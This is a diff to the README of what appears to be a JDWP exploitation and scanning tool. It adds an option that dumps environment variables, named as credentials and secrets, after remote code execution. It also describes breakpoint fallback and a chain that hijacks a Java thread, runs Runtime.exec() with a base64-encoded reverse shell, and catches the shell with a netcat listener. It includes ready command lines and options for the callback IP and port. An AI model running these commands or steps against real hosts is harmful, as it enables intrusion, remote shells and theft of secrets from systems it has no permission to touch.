@@ -32,6 +32,9 @@ python3 jdwp_check.py -t targets.txt --handshake-only
 # Custom breakpoint method (if default doesn't trigger)
 python3 jdwp_check.py -t targets.txt --break-on java.net.ServerSocket.accept
 
+# Dump environment variables after RCE (credentials, secrets, paths)
+python3 jdwp_check.py -t targets.txt --env
+
 # Disable colors (e.g. for piping to file)
 python3 jdwp_check.py -t targets.txt --no-color
 ```
@@ -55,11 +58,12 @@ See `targets.example.txt` for a sample.
 | `-t, --targets` | *required* | Path to target file |
 | `--callback-ip` | auto-detect | Your IP for reverse shell callbacks |
 | `--callback-port` | 44444 | Listener port for reverse shells |
-| `--break-on` | `java.lang.String.valueOf` | Java method to set breakpoint on |
+| `--break-on` | `java.lang.String.valueOf` | Java method to try first (auto-fallback on timeout) |
 | `--timeout` | 15 | JDWP exploit timeout (seconds) |
 | `--connect-timeout` | 5 | TCP connect timeout (seconds) |
 | `--shell-wait` | 5 | Wait time for reverse shell connect |
 | `--pause` | 5 | Pause between targets (seconds) |
+| `--env` | off | Dump environment variables after successful RCE |
 | `--handshake-only` | off | Skip RCE, only check handshakes |
 | `--no-color` | off | Disable ANSI colors |
 
@@ -68,7 +72,7 @@ See `targets.example.txt` for a sample.
 The integrated exploit follows the same approach as jdwp-shellifier:
 
 1. **JDWP connect** Full protocol handshake, enumerate classes and methods
-2. **Breakpoint** Set a breakpoint on a frequently called method (default: `java.lang.String.valueOf`)
+2. **Breakpoint** Set a breakpoint on a frequently called method (default: `java.lang.String.valueOf`). If the method doesn't trigger within the timeout, automatically falls back through `ServerSocket.accept` → `Thread.sleep` → `ClassLoader.loadClass` → `Socket.connect`
 3. **Thread hijack** When the breakpoint fires, hijack that thread's execution context
 4. **Runtime.exec()** Call `Runtime.getRuntime().exec()` with a base64-encoded reverse shell
 5. **Callback** A netcat listener catches the incoming shell and confirms RCE
